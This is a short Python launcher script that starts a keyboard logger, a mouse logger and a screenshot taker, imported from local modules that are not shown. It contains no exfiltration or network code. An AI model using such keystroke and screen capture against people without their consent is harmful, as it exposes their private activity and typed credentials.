from mouse_logger import MouseLogger
from keyboard_logger import KeyboardLogger
from screenshot_taker import ScreenshotTaker
# from program_terminator import ProgramTerminator



mouseLogger = MouseLogger()
keyLogger =  KeyboardLogger()
screenshotTaker = ScreenshotTaker()

def start_logger():
    mouseLogger.start()
    keyLogger.start()
    screenshotTaker.start()

def main():
    start_logger()
    print("##### Program Stopped! #####")


if __name__ == "__main__":
    main()